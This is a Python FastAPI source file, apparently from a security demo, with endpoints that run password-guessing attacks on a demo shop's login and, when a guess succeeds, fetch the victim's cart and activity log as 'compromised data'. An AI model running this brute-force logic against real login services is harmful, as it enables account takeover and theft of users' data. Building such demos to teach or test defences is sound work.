from typing import Literal

import requests
import os
from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session
from pydantic import BaseModel

from app.core.db import get_db
from app.crud.audit import get_all_activity_for_user

router = APIRouter()

COMMON_PWS = ["secret", "password", "123456", "ilikepizza"]
SHOP_URL = os.getenv("DEMO_SHOP_URL", "http://localhost:3005").rstrip("/")

@router.post("/simulate/demo-shop-attack")
def attack(payload: dict):
    attempts = payload.get("attempts", 50)
    shop_url = os.getenv("DEMO_SHOP_URL", "http://localhost:3005")
    results = []
    for _ in range(attempts):
        for pw in COMMON_PWS:
            r = requests.post(f"{shop_url}/login", json={"username":"alice","password":pw})
            results.append({"password": pw, "status": r.status_code})
    return {"results": results}


class AdminAttackPayload(BaseModel):
    target: Literal["alice", "ben"]
    attempts: int


@router.post("/simulate/admin-attack")
def admin_attack(payload: AdminAttackPayload, db: Session = Depends(get_db)):
    target = payload.target
    attempts = payload.attempts


    session = requests.Session()
    success_token = None
    used_attempts = attempts
    for i in range(attempts):
        pw = COMMON_PWS[i % len(COMMON_PWS)]
        try:
            resp = session.post(
                f"{SHOP_URL}/login",
                json={"username": target, "password": pw},
                timeout=2,
            )
            if resp.status_code == 200:
                data = resp.json()
                success_token = data.get("access_token")
                used_attempts = i + 1
                break
        except Exception:
            continue

    result = {"summary": "Attack blocked", "attempts": used_attempts}
    if success_token:
        cart = None
        try:
            cart_resp = session.get(
                f"{SHOP_URL}/cart",
                headers={"Authorization": f"Bearer {success_token}"},
                timeout=2,
            )
            if cart_resp.status_code == 200:
                cart = cart_resp.json()
        except Exception:
            cart = None

        activity = [
            {"event": log.event, "timestamp": log.timestamp.isoformat()}
            for log in get_all_activity_for_user(db, target)
        ]
        result["summary"] = "Attack succeeded"
        result["compromisedData"] = {"cart": cart, "activity": activity}

    return result
